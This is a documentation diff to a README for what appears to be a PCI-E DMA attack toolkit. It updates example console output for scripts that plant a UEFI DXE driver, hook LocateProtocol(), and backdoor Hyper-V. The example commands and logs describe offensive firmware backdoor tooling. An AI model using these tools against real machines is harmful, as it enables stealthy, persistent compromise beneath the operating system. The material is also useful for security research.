@@ -427,6 +427,8 @@ An example of `uefi_backdoor_simple.py` console output after the successful atta
 
 ```
 $ ./uefi_backdoor_simple.py --driver payloads/DmaBackdoorSimple/DmaBackdoorSimple_X64.efi
+[+] Using UEFI system table hook injection method
+[+] Reading DXE phase payload from payloads/DmaBackdoorSimple/DmaBackdoorSimple_X64.efi
 [!] Bad MRd TLP completion received
 [!] Bad MRd TLP completion received
 [!] Bad MRd TLP completion received
@@ -452,6 +454,7 @@ There's also another Python program &minus; `uefi_backdoor_hv.py`, it injects Hy
 
 ```
 $ ./uefi_backdoor_hv.py --driver payloads/DmaBackdoorHv/DmaBackdoorHv_X64.efi
+[+] Using UEFI system table hook injection method
 [+] Reading DXE phase payload from payloads/DmaBackdoorHv/DmaBackdoorHv_X64.efi
 [+] Waiting for PCI-E link...
 [!] PCI-E endpoint is not configured by root complex yet
@@ -470,7 +473,7 @@ Planting DXE stage driver at 0xc0000...
 Hooking LocateProtocol(): 0x7a3987b4 -> 0x000c0bd4
 3.611646 sec.
 [+] DXE driver was planted, waiting for backdoor init...
-[+] DXE driver was executed, you can read its debug messages by running this program with -d option
+[+] DXE driver was executed, you can read its debug messages by running this program with --debug-output option
 [+] Waiting for Hyper-V load...
 [+] Hyper-V image was loaded
 
